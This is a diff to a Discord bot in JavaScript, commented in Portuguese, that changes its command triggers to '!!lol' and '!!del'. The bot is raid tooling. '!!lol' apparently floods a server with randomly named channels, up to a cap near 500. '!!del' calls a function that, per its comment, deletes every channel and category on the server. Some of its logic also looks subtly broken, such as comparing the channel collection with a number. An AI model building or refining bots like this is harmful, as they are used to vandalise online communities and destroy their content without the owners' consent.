@@ -8,9 +8,6 @@ client.on("ready", () => {                                                      
 });
 
 client.on("message", async (message) => {
-    const args = message.content.slice(process.env.PREFIX).trim().split(/ +/g);
-    const comando = args.shift().toLowerCase();
-
     const server = message.guild.channels;                                                        //declara uma variavel que é o servidor
 
     function makeid(length) {                                                                     //função pra gerar uma string cheia de caracteres
@@ -24,7 +21,7 @@ client.on("message", async (message) => {
         return result;
     }
 
-    if(comando === "lol") {                                                                        //se o comando for lol vai executar tudo dentro dele
+    if(message.content === '!!lol') {                                                                        //se o comando for lol vai executar tudo dentro dele
        message.delete();                                                                           //deleta a mensagem do autor
        let i;                                                                                      //declara uma variavel a ser usada em um loop
        console.log(`ser humano falou ae meu parcero fode tudo ae men`)                             //manda uma msg no console falando ne
@@ -40,7 +37,7 @@ client.on("message", async (message) => {
 	if(message.guild.channels > 499) break;
        }
     }
-    if(comando === "del"){                                                                         //se o comando for del vai executar td dentro dele
+    if(message.content === '!!del'){                                                                         //se o comando for del vai executar td dentro dele
 	    console.log(`ser humano falou ae meu parcero deleta tudo ae men`)                      //manda uma mensagem no console falando isso ae
 	    message.delete();                                                                      //deleta a mensagem do autor
         server.deleteAll()                                                                         //deleta todos os canais e categorias do sv
